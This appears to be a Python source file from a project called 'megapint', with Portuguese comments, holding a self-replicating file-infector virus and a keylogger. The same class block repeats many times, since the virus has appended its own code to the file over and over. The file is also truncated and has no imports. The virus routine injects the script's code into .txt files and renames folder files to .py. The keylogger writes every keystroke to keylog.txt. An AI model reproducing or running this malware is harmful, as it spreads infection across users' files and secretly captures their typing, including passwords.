    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
